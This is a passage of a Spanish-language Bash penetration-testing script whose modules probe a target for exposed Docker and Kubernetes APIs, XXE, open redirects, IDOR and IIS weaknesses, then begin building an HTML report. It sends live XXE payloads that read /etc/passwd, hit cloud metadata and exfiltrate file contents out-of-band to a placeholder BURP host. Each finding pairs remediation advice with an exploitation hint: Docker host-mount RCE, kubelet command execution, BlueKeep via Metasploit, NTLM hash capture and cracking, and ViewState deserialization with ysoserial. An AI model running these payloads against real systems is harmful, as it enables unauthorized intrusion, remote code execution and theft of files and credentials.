                "Extraer nombre de dominio: curl -sI -H 'Authorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=' ${base_url} | base64 decode ntlm_challenge"
        fi
    fi
    echo
}

# ─── MÓDULO 38: DOCKER / KUBERNETES / INFRA ──────────────────────
modulo_infra_exposure() {
    log "MÓDULO 38: Docker / Kubernetes / Infraestructura Expuesta"
    tip "Docker API en 2375 sin TLS = RCE. K8s dashboard público = cluster comprometido."

    local out_file="${OUTPUT_DIR}/recon/infra_exposure.txt"

    # Docker API
    for docker_port in 2375 2376; do
        local docker_resp
        docker_resp=$(curl -sk --max-time 8 "http://${TARGET}:${docker_port}/v1.41/info" 2>/dev/null)
        if echo "$docker_resp" | grep -qiE "ServerVersion|Containers|NCPU|MemTotal|DockerRootDir"; then
            INTEL_DOCKER_EXPOSED=true
            local containers
            containers=$(curl -sk --max-time 8 "http://${TARGET}:${docker_port}/v1.41/containers/json" 2>/dev/null | \
                python3 -c "import json,sys; [print(c.get('Names',''),c.get('Image',''),c.get('Status','')) for c in json.load(sys.stdin)]" 2>/dev/null | head -10)

            add_finding "CRÍTICO" \
                "Docker API Expuesta sin Autenticación (Puerto ${docker_port})" \
                "<b>Containers activos:</b><pre>${containers}</pre><b>Info:</b><pre>${docker_resp:0:400}</pre>" \
                "10.0" \
                "1) Deshabilitar Docker API TCP sin TLS INMEDIATAMENTE. 2) Si se necesita TCP, usar TLS mutuo. 3) Usar socket Unix local /var/run/docker.sock con permisos estrictos." \
                "RCE inmediato: docker -H ${TARGET}:${docker_port} run -it --rm -v /:/mnt alpine chroot /mnt sh"

            echo "Docker API: ${TARGET}:${docker_port}" >> "$out_file"
            intel_log "CRÍTICO: Docker API expuesta → RCE posible"
        fi
    done

    # Kubernetes API / Dashboard
    for k8s_port in 8001 8080 6443 443 10250; do
        local k8s_resp
        k8s_resp=$(curl -sk --max-time 8 "https://${TARGET}:${k8s_port}/api/v1/namespaces" 2>/dev/null || \
                   curl -sk --max-time 8 "http://${TARGET}:${k8s_port}/api/v1/namespaces" 2>/dev/null)
        if echo "$k8s_resp" | grep -qiE "namespaces|kube-system|default|items"; then
            INTEL_K8S_EXPOSED=true
            add_finding "CRÍTICO" \
                "Kubernetes API Accesible sin Autenticación (Puerto ${k8s_port})" \
                "<pre>${k8s_resp:0:400}</pre>" \
                "10.0" \
                "Habilitar RBAC. Usar NetworkPolicy. Deshabilitar anonymous auth. Proteger puertos API con firewall." \
                "Listar secretos: kubectl --server=https://${TARGET}:${k8s_port} get secrets --all-namespaces"
        fi

        # Kubelet
        local kubelet_resp
        kubelet_resp=$(curl -sk --max-time 8 "https://${TARGET}:10250/pods" 2>/dev/null)
        if echo "$kubelet_resp" | grep -qiE "podList|namespace|containers"; then
            add_finding "CRÍTICO" \
                "Kubelet API Expuesta (Puerto 10250)" \
                "<pre>${kubelet_resp:0:300}</pre>" \
                "10.0" \
                "Habilitar autenticación en Kubelet: --anonymous-auth=false --authorization-mode=Webhook" \
                "RCE: curl -sk https://${TARGET}:10250/run/NAMESPACE/POD/CONTAINER -d 'cmd=id'"
        fi
    done

    # Prometheus / Grafana / Kibana sin auth
    local mgmt_ports=("9090:Prometheus" "3000:Grafana" "5601:Kibana" "9100:NodeExporter" "8500:Consul" "4646:Nomad")
    for port_svc in "${mgmt_ports[@]}"; do
        local mport="${port_svc%%:*}" mname="${port_svc##*:}"
        local mresp
        mresp=$(curl -sk --max-time 6 "http://${TARGET}:${mport}/" 2>/dev/null)
        if echo "$mresp" | grep -qiE "${mname,,}|dashboard|metrics|graph|login"; then
            local mstatus
            mstatus=$(curl -sko /dev/null -w "%{http_code}" --max-time 6 "http://${TARGET}:${mport}/" 2>/dev/null)
            [[ "$mstatus" == "200" ]] && add_finding "ALTO" \
                "${mname} Expuesto sin Autenticación (Puerto ${mport})" \
                "Panel de ${mname} accesible. Puede exponer métricas, logs o configuración interna." \
                "7.5" \
                "Proteger ${mname} con autenticación. Limitar acceso por IP/VPN. No exponer a internet." \
                "Acceder: http://${TARGET}:${mport}/ | Buscar credenciales por defecto: admin/admin, admin/secret"
        fi
    done

    # RDP BlueKeep check (nmap)
    if echo "$OPEN_PORTS_CSV" | grep -qE "(^|,)3389(,|$)"; then
        add_finding "ALTO" \
            "RDP Expuesto (Puerto 3389)" \
            "Remote Desktop Protocol accesible. Verificar NLA y CVEs como BlueKeep (CVE-2019-0708)." \
            "7.5" \
            "Habilitar NLA (Network Level Authentication). Mover RDP a puerto no estándar. Usar VPN. Aplicar parches de seguridad." \
            "Verificar BlueKeep: nmap -p 3389 --script rdp-vuln-ms12-020 ${TARGET} | Usar metasploit: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce"
    fi
    echo
}



# ─── MÓDULO 39: XXE — XML EXTERNAL ENTITY ────────────────────────
modulo_xxe() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 39: XXE — XML External Entity Injection"
    tip "XXE afecta parsers XML: SOAP, SVG upload, Office docs, APIs. Puede leer /etc/passwd o hacer SSRF."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/xxe_results.txt"
    local found=0

    # ── INTEL READ: solo si hay APIs XML o .NET/Java detectado ──
    local relevant=false
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " java "    ]] && relevant=true
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " aspnet "  ]] && relevant=true
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " dotnetcore " ]] && relevant=true
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " php "     ]] && relevant=true
    [[ ${#INTEL_API_ENDPOINTS[@]} -gt 0 ]]            && relevant=true
    [[ "$relevant" == "false" ]] && {
        warn "XXE: sin API XML o tecnología susceptible detectada. Saltar o forzar con módulo custom."
        return
    }

    # Payloads XXE
    local XXE_BASIC='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
    local XXE_WIN='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>'
    local XXE_SSRF='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'
    local XXE_OOB='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://COLLABORATOR/evil.dtd">%remote;]><root/>'
    local XXE_PHP='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>'
    local XXE_BLIND='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % oob "<!ENTITY exfil SYSTEM '"'"'http://BURP/?d=%file;'"'"'>">%oob;]><root>&exfil;</root>'

    local endpoints_to_test=("${base_url}" "${base_url}/api" "${base_url}/api/v1" "${base_url}/soap" "${base_url}/ws" "${base_url}/webservice" "${base_url}/service")
    # Agregar API endpoints de intel
    for ep in "${INTEL_API_ENDPOINTS[@]}"; do
        endpoints_to_test+=("$ep")
    done

    echo "XXE Test Results — $(date)" > "$out_file"
    local xxe_html=""

    for endpoint in "${endpoints_to_test[@]}"; do
        local target_keyword
        target_keyword="${INTEL_OS:-linux}"
        local payload="$XXE_BASIC"
        [[ "$target_keyword" == "windows" ]] && payload="$XXE_WIN"

        for ct in "application/xml" "text/xml" "application/soap+xml"; do
            local resp
            resp=$(curl -sk --max-time 10 \
                -X POST \
                -H "Content-Type: ${ct}" \
                -d "$payload" \
                "$endpoint" 2>/dev/null)

            # Detectar respuesta exitosa de /etc/passwd o win.ini
            if echo "$resp" | grep -qE "root:.*:0:0|bin:.*:/bin|daemon:|nobody:|windows|for 16-bit app"; then
                ((found++))
                ok "XXE CONFIRMADO en: ${endpoint} [Content-Type: ${ct}]"
                echo "VULN: $endpoint [${ct}]" >> "$out_file"
                xxe_html+="<tr><td class='critical'>CRÍTICO</td><td>${endpoint}</td><td>${ct}</td><td>Archivo del sistema leído ✅</td></tr>"

                add_finding "CRÍTICO" \
                    "XXE — XML External Entity Injection (${ct})" \
                    "<b>Endpoint:</b> ${endpoint}<br><b>Content-Type:</b> ${ct}<br><b>Respuesta:</b><pre>${resp:0:300}</pre>" \
                    "9.1" \
                    "1) Deshabilitar procesamiento de entidades externas en el parser XML. 2) PHP: libxml_disable_entity_loader(true). 3) Java: factory.setFeature('http://xml.org/sax/features/external-general-entities', false). 4) Usar parsers seguros por defecto (no-op external entity handler)." \
                    "Leer archivos: cambiar SYSTEM 'file:///ruta'. SSRF: SYSTEM 'http://169.254.169.254/'. Para blind XXE usar Burp Collaborator."
                break 2
            fi

            # Detectar error que revela parsing XML (positivo parcial)
            if echo "$resp" | grep -qiE "xml.parse|SAXParseException|XMLSyntaxError|entity.*not.*defined|DOCTYPE.*not.*allowed"; then
                xxe_html+="<tr><td class='high'>PARCIAL</td><td>${endpoint}</td><td>${ct}</td><td>Parser XML expuesto (error revelado)</td></tr>"
                add_finding "MEDIO" \
                    "Parser XML Expuesto — Posible XXE" \
                    "<b>Endpoint:</b> ${endpoint}<br>El servidor reveló errores de parsing XML.<br><b>Respuesta:</b><pre>${resp:0:200}</pre>" \
                    "6.5" \
                    "Configurar el parser XML para no revelar errores detallados. Deshabilitar entidades externas." \
                    "Probar XXE con Burp Suite: Intruder con payloads de XXE. Ver: https://portswigger.net/web-security/xxe"
            fi

            [[ "$INTEL_SCAN_DELAY" -gt 0 ]] && sleep "0.${INTEL_SCAN_DELAY}"
        done
    done

    # SVG upload XXE (si hay formularios con file upload)
    local upload_test
    upload_test=$(curl -sk --max-time 10 \
        -X POST \
        -F "file=@/dev/stdin;filename=test.svg;type=image/svg+xml" \
        -d '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>' \
        "${base_url}/upload" 2>/dev/null || true)
    if echo "$upload_test" | grep -qE "root:.*:0:0|bin:.*:/bin"; then
        add_finding "CRÍTICO" "XXE via SVG Upload" \
            "El endpoint /upload procesa SVG con entidades externas. Archivo del sistema leído." \
            "9.1" \
            "Validar tipo de archivo por contenido (magic bytes), no por extensión. Sanitizar SVG antes de procesar. No renderizar SVG del usuario server-side." \
            "Subir SVG con payload XXE. Cambiar 'file:///etc/passwd' por otros archivos sensibles."
    fi

    if (( found == 0 )); then
        ok "XXE: no se detectó XXE básico en endpoints probados."
        add_finding "INFO" "XXE" \
            "No se detectó XXE básico. Blind XXE (Out-of-Band) requiere Burp Collaborator." \
            "N/A" \
            "Revisar manualmente endpoints que acepten XML. Probar SVG/Office uploads." \
            "Herramienta especializada: XXEinjector | Burp Suite Pro con XXE scanner"
    else
        add_finding "CRÍTICO" "Resumen XXE: ${found} endpoint(s) vulnerables" \
            "<table class='vuln-table'><tr><th>Severidad</th><th>Endpoint</th><th>Content-Type</th><th>Resultado</th></tr>${xxe_html}</table>" \
            "9.1" \
            "Aplicar remediación en TODOS los parsers XML del stack. Revisar dependencias que parseen XML (librerías, formatos de Office, feeds RSS)." \
            "Ver archivo completo: ${out_file}"
    fi
    echo
}

# ─── MÓDULO 40: OPEN REDIRECT + IDOR ─────────────────────────────
modulo_idor_redirect() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 40: Open Redirect + IDOR (Insecure Direct Object Reference)"
    tip "Open Redirect → phishing bypass. IDOR → acceso a datos de otros usuarios. Muy comunes en bug bounty."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/idor_redirect.txt"
    local found_redirect=0 found_idor=0

    echo "Open Redirect + IDOR — $(date)" > "$out_file"

    # ═══════════════════════════════════════════════════════
    # PARTE 1: OPEN REDIRECT
    # ═══════════════════════════════════════════════════════
    log "  ── Open Redirect ──"

    local REDIRECT_PARAMS=("redirect" "url" "next" "return" "returnUrl" "returnTo" "redir" "redirect_to"
        "redirect_url" "goto" "go" "continue" "dest" "destination" "forward" "location" "target"
        "to" "link" "callback" "out" "view" "site" "web" "ref" "back" "r" "l")

    local REDIRECT_PAYLOADS=(
        "//evil.com"
        "https://evil.com"
        "//evil.com/%2F.."
        "https:evil.com"
        "//evil%2Ecom"
        "/\\evil.com"
        "///evil.com"
        "/%09/evil.com"
        "https://evil.com?@${TARGET}"
        "https://${TARGET}.evil.com"
    )

    # Usar URLs de gobuster/arjun que tienen parámetros
    local test_urls=("${base_url}")
    for u in "${INTEL_INJECTABLE_URLS[@]}"; do
        test_urls+=("${u%%=*}") # solo la parte base sin valor
    done

    for test_url in "${test_urls[@]:0:5}"; do
        for param in "${REDIRECT_PARAMS[@]}"; do
            for payload in "${REDIRECT_PAYLOADS[@]:0:4}"; do
                local full_url="${test_url}?${param}=${payload}"
                local resp_headers
                resp_headers=$(curl -sk --max-time 8 -I "${full_url}" 2>/dev/null)

                local location
                location=$(echo "$resp_headers" | grep -i "^location:" | tr -d '\r')

                if echo "$location" | grep -qiE "evil\.com|//${payload//\//}|${payload}"; then
                    ((found_redirect++))
                    ok "OPEN REDIRECT: ${param}=${payload}"
                    echo "REDIRECT VULN: ${full_url}" >> "$out_file"
                    add_finding "MEDIO" \
                        "Open Redirect — Parámetro: ${param}" \
                        "<b>URL:</b> ${full_url}<br><b>Location:</b> ${location}<br><b>Impacto:</b> Phishing bypass: el enlace parece legítimo (${TARGET}) pero redirige a sitio malicioso." \
                        "6.1" \
                        "1) Validar que la URL de redirect pertenece al dominio propio. 2) Usar whitelist de dominios permitidos. 3) No pasar URLs externas directamente al header Location." \
                        "PoC phishing: ${base_url}?${param}=https://evil.com | Escalar con XSS: ?${param}=javascript:alert(1)"
                    break 3
                fi
            done
        done
    done

    [[ $found_redirect -eq 0 ]] && ok "Open Redirect: no detectado en parámetros probados."

    # ═══════════════════════════════════════════════════════
    # PARTE 2: IDOR — Insecure Direct Object Reference
    # ═══════════════════════════════════════════════════════
    log "  ── IDOR Detection ──"

    # Obtener una respuesta baseline con ID=1
    local IDOR_PARAMS=("id" "user_id" "userId" "account" "profile" "order" "order_id"
        "invoice" "doc" "document" "file_id" "record" "uid" "pid" "rid" "tid" "key")

    local idor_html=""
    local baseline_resp=""

    for param in "${IDOR_PARAMS[@]}"; do
        local url1="${base_url}?${param}=1"
        local url2="${base_url}?${param}=2"
        local url3="${base_url}?${param}=100"

        local resp1 resp2 resp3
        resp1=$(curl -sk --max-time 8 "$url1" 2>/dev/null | wc -c)
        resp2=$(curl -sk --max-time 8 "$url2" 2>/dev/null | wc -c)

        # Si los tamaños son diferentes → posible IDOR (respuestas distintas para IDs distintos)
        if [[ "$resp1" -gt 100 && "$resp2" -gt 100 ]]; then
            local diff=$(( resp1 - resp2 ))
            [[ $diff -lt 0 ]] && diff=$(( -diff ))

            if [[ $resp1 -ne $resp2 && $diff -gt 50 ]]; then
                ((found_idor++))
                ok "IDOR potencial: ?${param}=1 (${resp1}b) vs ?${param}=2 (${resp2}b) — respuestas diferentes"
                idor_html+="<tr><td class='high'>POTENCIAL</td><td>${base_url}</td><td>${param}</td>"
                idor_html+="<td>ID=1: ${resp1} bytes | ID=2: ${resp2} bytes | Diff: ${diff}b</td></tr>"
                echo "IDOR?: ${base_url}?${param}=[1,2,100] → respuestas distintas" >> "$out_file"
            fi
        fi

        # También probar en APIs encontradas
        for api_ep in "${INTEL_API_ENDPOINTS[@]:0:5}"; do
            local api1="${api_ep}/${param}/1"
            local api2="${api_ep}/${param}/2"
            local ar1 ar2
            ar1=$(curl -sk --max-time 8 "$api1" 2>/dev/null | wc -c)
            ar2=$(curl -sk --max-time 8 "$api2" 2>/dev/null | wc -c)

            if [[ "$ar1" -gt 50 && "$ar2" -gt 50 && "$ar1" -ne "$ar2" ]]; then
                ((found_idor++))
                idor_html+="<tr><td class='high'>API-IDOR</td><td>${api_ep}</td><td>${param}</td>"
                idor_html+="<td>ID=1: ${ar1} bytes | ID=2: ${ar2} bytes</td></tr>"
            fi
        done

        [[ "$INTEL_SCAN_DELAY" -gt 0 ]] && sleep "0.${INTEL_SCAN_DELAY}"
    done

    if (( found_idor > 0 )); then
        add_finding "ALTO" \
            "IDOR — Posible Acceso No Autorizado a Objetos (${found_idor} parámetros)" \
            "<table class='vuln-table'><tr><th>Tipo</th><th>URL</th><th>Parámetro</th><th>Evidencia</th></tr>${idor_html}</table>" \
            "7.5" \
            "1) Verificar autorización en CADA acceso a objeto: ¿el usuario autenticado tiene permiso para este ID? 2) Usar IDs indirectos (UUID, tokens) en lugar de IDs secuenciales. 3) Implementar access control a nivel de objeto (ABAC)." \
            "Verificar manualmente con Burp: cambiar IDs y observar si se accede a datos de otros usuarios. Probar con dos cuentas diferentes."
    else
        ok "IDOR: sin indicios claros (requiere autenticación para validar completamente)."
        add_finding "INFO" "IDOR" \
            "No se detectaron indicios automáticos de IDOR. Las pruebas definitivas requieren autenticación." \
            "N/A" \
            "Revisar manualmente todos los endpoints con IDs. Usar dos cuentas para validar cross-account access." \
            "Automatizar con autorize (Burp plugin): https://github.com/Quitten/Autorize"
    fi

    [[ -f "$out_file" ]] && ok "Resultados: ${out_file}"
    echo
}

# ─── MÓDULO 41: WINDOWS IIS — ESPECÍFICO ─────────────────────────
modulo_iis_windows() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    # Solo ejecutar si IIS/Windows detectado
    if [[ "$INTEL_OS" != "windows" ]] && \
       [[ ! " ${INTEL_TECHNOLOGIES[*]} " =~ " iis "    ]] && \
       [[ ! " ${INTEL_TECHNOLOGIES[*]} " =~ " aspnet "  ]] && \
       [[ ! " ${INTEL_TECHNOLOGIES[*]} " =~ " dotnetcore " ]]; then
        warn "IIS/Windows no detectado. Saltando módulo específico de IIS."
        return
    fi

    log "MÓDULO 41: IIS/Windows — Tests Específicos"
    tip "IIS tiene vulns únicas: ShortName 8.3, WebDAV, ViewState, NTLM exposure, trace.axd"

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/iis_windows.txt"

    echo "IIS/Windows Tests — $(date)" > "$out_file"
    intel_log "IIS/Windows detectado → ejecutando tests específicos"

    # ── TEST 1: IIS ShortName (8.3 filename enumeration) ──
    log "  ── ShortName Enumeration ──"
    local short_vuln=false
    local short_resp
    short_resp=$(curl -sk --max-time 10 -w "%{http_code}" \
        "${base_url}/*~1*/a.aspx" 2>/dev/null | tail -1)
    local short_resp2
    short_resp2=$(curl -sk --max-time 10 -w "%{http_code}" \
        "${base_url}/a*~1*/a.aspx" 2>/dev/null | tail -1)

    if [[ "$short_resp" == "404" && "$short_resp2" != "404" ]] || \
       [[ "$short_resp" == "400" && "$short_resp2" == "404" ]]; then
        short_vuln=true
        add_finding "MEDIO" \
            "IIS ShortName (8.3) Enumeration Posible" \
            "Diferencia de respuestas HTTP indica que se puede enumerar nombres cortos de archivos/directorios.<br><code>/*~1*/ → ${short_resp} | /a*~1*/ → ${short_resp2}</code>" \
            "5.3" \
            "Deshabilitar soporte de nombres 8.3 en Windows: fsutil 8dot3name set C: 1. O filtrar en IIS con URLScan." \
            "Herramienta: python IIS-ShortName-Scanner.py ${base_url} | Revela archivos como: web~1.con (web.config)"
        echo "ShortName vulnerable: diferencia de respuestas detectada" >> "$out_file"
    fi

    # ── TEST 2: trace.axd (ASP.NET debugging) ──
    log "  ── trace.axd / elmah.axd ──"
    for debug_path in "/trace.axd" "/elmah.axd" "/.git/config" "/app_offline.htm" \
                      "/web.config.bak" "/web.config.old" "/Web.config" \
                      "/_blazor" "/_framework/blazor.webassembly.js"; do
        local debug_code
        debug_code=$(curl -sko /dev/null --max-time 8 -w "%{http_code}" "${base_url}${debug_path}" 2>/dev/null)
        if [[ "$debug_code" == "200" ]]; then
            ok "ENCONTRADO: ${base_url}${debug_path}"
            echo "EXPOSED: ${base_url}${debug_path}" >> "$out_file"
            local sev="MEDIO"
            [[ "$debug_path" =~ "web.config" ]] && sev="CRÍTICO"
            [[ "$debug_path" =~ "trace.axd" ]] && sev="ALTO"

            add_finding "$sev" \
                "IIS/ASP.NET: ${debug_path} Accesible" \
                "<b>URL:</b> ${base_url}${debug_path}<br>Este recurso puede exponer código fuente, configuración, cadenas de conexión o trazas de stack." \
                "$([ "$sev" == "CRÍTICO" ] && echo "9.1" || echo "6.5")" \
                "Bloquear acceso a archivos de configuración y debug en IIS: usar <authorization> en web.config o rules en applicationHost.config." \
                "curl -s ${base_url}${debug_path} | grep -iE 'connectionString|password|secret|apiKey'"
        fi
    done

    # ── TEST 3: WebDAV ──
    log "  ── WebDAV ──"
    local dav_resp
    dav_resp=$(curl -sk --max-time 10 -X OPTIONS "${base_url}" 2>/dev/null -D - | grep -i "^DAV:\|^Allow:.*PROPFIND\|^Allow:.*PUT")
    if [[ -n "$dav_resp" ]]; then
        add_finding "ALTO" \
            "WebDAV Habilitado en IIS" \
            "<pre>${dav_resp}</pre><br>WebDAV permite subir, modificar y eliminar archivos remotamente." \
            "8.8" \
            "Deshabilitar WebDAV si no es necesario. En IIS Manager: WebDAV Authoring Rules → deshabilitar. En web.config: <modules><remove name='WebDAVModule'/></modules>" \
            "Explotar con: davtest -url ${base_url} | cadaver ${base_url} | msf: exploit/windows/iis/iis_webdav_upload_asp"
        echo "WebDAV: $dav_resp" >> "$out_file"
    fi

    # ── TEST 4: NTLM Authentication Exposure ──
    log "  ── NTLM Auth Exposure ──"
    local ntlm_resp
    ntlm_resp=$(curl -sk --max-time 10 -I "${base_url}" 2>/dev/null | grep -i "WWW-Authenticate: NTLM\|WWW-Authenticate: Negotiate")
    if [[ -n "$ntlm_resp" ]]; then
        # Intentar obtener el dominio del challnge NTLM
        local ntlm_info
        ntlm_info=$(curl -sk --max-time 10 \
            -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" \
            "${base_url}" 2>/dev/null -I | grep -i "WWW-Authenticate: NTLM")
        add_finding "MEDIO" \
            "NTLM Authentication Expuesta" \
            "<pre>${ntlm_resp}${ntlm_info}</pre><br>NTLM expuesto puede revelar nombre de dominio y ser objetivo de captura de hashes." \
            "5.9" \
            "Preferir Kerberos sobre NTLM. Deshabilitar NTLMv1. Requerir NTLMv2 con firma. Considerar migrar a autenticación moderna (OAuth/OIDC)." \
            "Capturar hash: responder -I eth0 → crackear con hashcat -m 5600 hash.txt rockyou.txt"
        echo "NTLM: $ntlm_resp" >> "$out_file"
    fi

    # ── TEST 5: ASP.NET ViewState sin MAC ──
    log "  ── ViewState MAC Check ──"
    local vs_resp
    vs_resp=$(curl -sk --max-time 10 "${base_url}" 2>/dev/null)
    if echo "$vs_resp" | grep -qi "__VIEWSTATE"; then
        local vs_val
        vs_val=$(echo "$vs_resp" | grep -oP '(?<=__VIEWSTATE" value=")[^"]+' | head -1)
        if [[ -n "$vs_val" ]]; then
            # Intentar enviar ViewState modificado (sin firmar)
            local fake_vs
            fake_vs=$(echo "$vs_val" | head -c 20)"AAAAAAAAAAAAAAAA=="
            local vs_resp2
            vs_resp2=$(curl -sk --max-time 10 -X POST \
                -d "__VIEWSTATE=${fake_vs}&__VIEWSTATEGENERATOR=FFFFFFFF" \
                "${base_url}" 2>/dev/null)

            if echo "$vs_resp2" | grep -qiE "error|exception|stack.trace|System\\."; then
                add_finding "ALTO" \
                    "ASP.NET ViewState — MAC Validation Débil" \
                    "ViewState modificado genera error que revela stack trace. Posible deserialization attack." \
                    "7.5" \
                    "Habilitar ViewState MAC: <pages enableViewStateMac='true'/> en web.config. Usar machineKey con algoritmo fuerte." \
                    "Explotar con ysoserial.net: ysoserial.exe -p ViewState -g TypeConfuseDelegate -c 'whoami' --validationkey=KEY"
            else
                add_finding "BAJO" \
                    "ASP.NET ViewState Presente" \
                    "ViewState detectado pero MAC aparentemente válida. Verificar si está cifrado." \
                    "3.1" \
                    "Asegurar ViewState con encryptViewState=true y machineKey. Considerar migrar a alternativas stateless." \
                    "Analizar con Burp Suite: decodificar ViewState base64, verificar si contiene datos sensibles."
            fi
        fi
    fi

    ok "IIS/Windows tests completados: ${out_file}"
    echo
}


# ─── REPORTE HTML PROFESIONAL ────────────────────────────────────
generar_reporte_html() {
    log "Generando Reporte HTML Profesional..."

    # ── INTEL SUMMARY: construir resumen de lo aprendido ──
    local intel_summary_html=""
    intel_summary_html+="<div class='intel-box'>"
    intel_summary_html+="<h3>🧠 Contexto Acumulado (INTEL)</h3>"
    intel_summary_html+="<div class='intel-grid'>"
    [[ -n "$INTEL_OS" ]]           && intel_summary_html+="<div class='intel-item'><span class='intel-label'>OS</span><span class='intel-val'>${INTEL_OS}</span></div>"
    [[ -n "$INTEL_CMS" ]]          && intel_summary_html+="<div class='intel-item'><span class='intel-label'>CMS</span><span class='intel-val'>${INTEL_CMS}</span></div>"
    [[ -n "$INTEL_FRAMEWORK_JS" ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>Framework JS</span><span class='intel-val'>${INTEL_FRAMEWORK_JS}</span></div>"
    intel_summary_html+="<div class='intel-item'><span class='intel-label'>WAF</span><span class='intel-val'>$([ "$INTEL_WAF_DETECTED" = "true" ] && echo "${INTEL_WAF_NAME}" || echo "No detectado")</span></div>"
    [[ ${#INTEL_TECHNOLOGIES[@]} -gt 0 ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>Tecnologías</span><span class='intel-val'>${INTEL_TECHNOLOGIES[*]}</span></div>"
    [[ ${#INTEL_API_ENDPOINTS[@]} -gt 0 ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>API Endpoints</span><span class='intel-val'>${#INTEL_API_ENDPOINTS[@]} encontrados</span></div>"
    [[ ${#INTEL_SERVICES[@]} -gt 0 ]]     && intel_summary_html+="<div class='intel-item'><span class='intel-label'>Servicios</span><span class='intel-val'>${#INTEL_SERVICES[@]} detectados</span></div>"
    intel_summary_html+="<div class='intel-item'><span class='intel-label'>SQLi</span><span class='intel-val'>$([ "$INTEL_SQLI_FOUND" = "true" ] && echo "CONFIRMADO ⚠" || echo "No detectado")</span></div>"
    intel_summary_html+="<div class='intel-item'><span class='intel-label'>XSS</span><span class='intel-val'>$([ "$INTEL_XSS_FOUND" = "true" ] && echo "CONFIRMADO ⚠" || echo "No detectado")</span></div>"
    [[ -n "$INTEL_GRAPHQL_URL" ]]  && intel_summary_html+="<div class='intel-item'><span class='intel-label'>GraphQL</span><span class='intel-val'>${INTEL_GRAPHQL_URL}</span></div>"
    [[ -n "$INTEL_SWAGGER_URL" ]]  && intel_summary_html+="<div class='intel-item'><span class='intel-label'>Swagger</span><span class='intel-val'>${INTEL_SWAGGER_URL}</span></div>"
    [[ "$INTEL_XXE_FOUND" == "true"           ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>XXE</span><span class='intel-val'>CONFIRMADO ⚠</span></div>"
    [[ "$INTEL_OPEN_REDIRECT_FOUND" == "true" ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>Open Redirect</span><span class='intel-val'>CONFIRMADO</span></div>"
    [[ "$INTEL_IDOR_FOUND" == "true"          ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>IDOR</span><span class='intel-val'>POTENCIAL ⚠</span></div>"
    [[ "$INTEL_WEBDAV" == "true"              ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>WebDAV</span><span class='intel-val'>ACTIVO ⚠</span></div>"
    [[ "$INTEL_DOCKER_EXPOSED" == "true"      ]] && intel_summary_html+="<div class='intel-item' style='border-color:#ff2d2d'><span class='intel-label'>Docker API</span><span class='intel-val' style='color:#ff2d2d'>EXPUESTA ⚠</span></div>"
    [[ "$INTEL_K8S_EXPOSED" == "true"         ]] && intel_summary_html+="<div class='intel-item' style='border-color:#ff2d2d'><span class='intel-label'>Kubernetes</span><span class='intel-val' style='color:#ff2d2d'>EXPUESTO ⚠</span></div>"
    [[ -n "$INTEL_CLOUD_PROVIDER" ]] && intel_summary_html+="<div class='intel-item'><span class='intel-label'>Cloud</span><span class='intel-val'>${INTEL_CLOUD_PROVIDER}</span></div>"
    intel_summary_html+="</div></div>"

    local critical_count=0 high_count=0 medium_count=0 low_count=0 info_count=0
    local total_cvss=0 cvss_count=0
    local findings_html=""
    local exec_critical="" exec_high="" exec_medium=""

    for finding in "${FINDINGS[@]}"; do
        local severity title detail cvss remediation next_step
        severity=$(echo    "$finding" | awk -F'|||' '{print $1}')
        title=$(echo       "$finding" | awk -F'|||' '{print $2}')
        detail=$(echo      "$finding" | awk -F'|||' '{print $3}')
        cvss=$(echo        "$finding" | awk -F'|||' '{print $4}')
        remediation=$(echo "$finding" | awk -F'|||' '{print $5}')
        next_step=$(echo   "$finding" | awk -F'|||' '{print $6}')

        case "$severity" in
            "CRÍTICO") ((critical_count++)); color="#ff2d2d"; sev_num=4 ;;
            "ALTO")    ((high_count++));     color="#ff6b35"; sev_num=3 ;;
            "MEDIO")   ((medium_count++));   color="#ffd23f"; sev_num=2 ;;
            "BAJO")    ((low_count++));      color="#57cc99"; sev_num=1 ;;
            *)         ((info_count++));     color="#5bc0de"; sev_num=0 ;;
        esac

        # CVSS promedio
        if [[ "$cvss" =~ ^[0-9] ]]; then
